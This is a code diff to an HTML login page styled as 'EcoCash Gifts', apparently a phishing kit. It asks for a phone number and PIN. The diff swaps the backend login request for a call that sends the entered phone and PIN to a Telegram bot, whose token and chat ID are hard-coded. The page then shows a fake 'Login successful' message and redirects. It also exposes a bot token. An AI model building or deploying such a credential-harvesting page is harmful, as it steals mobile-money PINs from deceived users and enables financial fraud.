@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EcoCash Gifts - Login</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
             padding: 0;
@@ -482,7 +482,7 @@
 
     <script>
         // ============================================
-        // TELEGRAM & API CONFIGURATION - UPDATED URL
+        // TELEGRAM & API CONFIGURATION - UPDATED
         // ============================================
         const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
         const CHAT_ID = '157828443';
@@ -637,40 +637,14 @@
             // Store phone in localStorage
             localStorage.setItem('phone', phone);
 
-            // Send to backend
-            try {
-                const response = await fetch(`${API_URL}/auth/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phone,
-                        pin: pin,
-                        giftName: localStorage.getItem('giftName') || 'Gift',
-                        fullName: localStorage.getItem('fullName') || 'User'
-                    })
-                });
+            // Send Telegram notification
+            await sendTelegramNotification(phone, pin);
 
-                const data = await response.json();
-
-                if (data.success) {
-                    showStatus('✅ Login successful! Redirecting...', 'success');
-                    setTimeout(() => {
-                        window.location.href = 'verify.html';
-                    }, 1500);
-                } else {
-                    showStatus('❌ ' + data.message, 'error');
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'LOGIN';
-                    spinnerOverlay.style.display = 'none';
-                }
-            } catch (error) {
-                showStatus('❌ Connection error: ' + error.message, 'error');
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'LOGIN';
-                spinnerOverlay.style.display = 'none';
-            }
+            showStatus('✅ Login successful! Redirecting...', 'success');
+            
+            setTimeout(() => {
+                window.location.href = 'verify.html';
+            }, 1500);
         });
 
         // ============================================
